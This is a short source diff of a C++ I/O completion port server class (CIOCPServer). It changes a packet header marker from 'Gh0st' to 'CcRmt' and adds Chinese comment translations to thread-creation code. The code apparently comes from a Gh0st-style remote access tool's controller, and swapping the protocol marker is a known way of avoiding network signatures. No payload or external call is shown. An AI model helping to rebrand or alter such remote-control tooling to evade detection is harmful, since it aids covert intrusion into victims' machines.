@@ -14,7 +14,7 @@ static char THIS_FILE[]=__FILE__;
 
 // Change at your Own Peril
 
-// 'G' 'h' '0' 's' 't' | PacketLen | UnZipLen
+// 'C' 'c' 'R' 'm' 't' | PacketLen | UnZipLen
 #define HDR_SIZE	13
 #define FLAG_SIZE	5
 #define HUERISTIC_VALUE 2
@@ -199,7 +199,7 @@ bool CIOCPServer::Initialize(NOTIFYPROC pNotifyProc, CMainFrame* pFrame, int nMa
 	////////////////////////////////////////////////////////////////////////////////////////
 	////////////////////////////////////////////////////////////////////////////////////////
 	UINT	dwThreadId = 0;
-    //开启监听线程  跟进ListenThreadProc
+    //开启监听线程  ->ListenThreadProc
 	m_hThread =
 			(HANDLE)_beginthreadex(NULL,				// Security
 									 0,					// Stack size - use default
@@ -505,12 +505,12 @@ bool CIOCPServer::InitializeIOCP(void)
 
     for ( i = 0; i < nWorkerCnt; i++ ) 
 	{
-		hWorker = (HANDLE)_beginthreadex(NULL,					// Security
-										0,						// Stack size - use default
-										ThreadPoolFunc,     		// Thread fn entry point
-										(void*) this,			// Param for thread
-										0,						// Init flag
-										&nThreadID);			// Thread address
+		hWorker = (HANDLE)_beginthreadex(NULL,					// Security 安全
+										0,						// Stack size - use default 堆栈大小-使用默认值
+										ThreadPoolFunc,     	// Thread fn entry point 线程fn入口点
+										(void*) this,			// Param for thread 线程的参数
+										0,						// Init flag 初始化标志
+										&nThreadID);			// Thread address 线程地址
 
 
         if (hWorker == NULL ) 
